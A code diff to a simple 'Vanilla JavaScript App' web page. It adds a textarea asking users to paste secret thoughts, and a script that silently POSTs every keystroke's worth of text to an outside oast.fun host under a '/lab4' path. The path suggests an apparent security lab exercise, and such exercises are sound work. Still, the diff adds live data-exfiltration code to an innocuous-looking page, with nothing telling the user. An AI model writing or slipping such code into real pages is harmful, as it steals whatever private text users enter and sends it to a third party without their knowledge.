@@ -11,7 +11,17 @@
 <body>
   <main>
     <h1>Vanilla JavaScript App</h1>
+    <textarea id="secretThoughts" rows="10" cols="50" placeholder="Paste your secret thoughts here..." style="width: 100%; max-width: 500px;" onInput="phone()"></textarea>
   </main>
+<script>
+function phone(){
+  let secret = document.getElementById("secretThoughts").value
+  fetch('https://gmzteyyguzgpvlgmtbmwv3y58z8ayto5i.oast.fun/lab4', {
+    method: "POST",
+    body: secret
+  }).then((res) => {console.log(res)}).catch((err) => {console.error(err)})
+}
+</script>
 </body>
 
 </html>
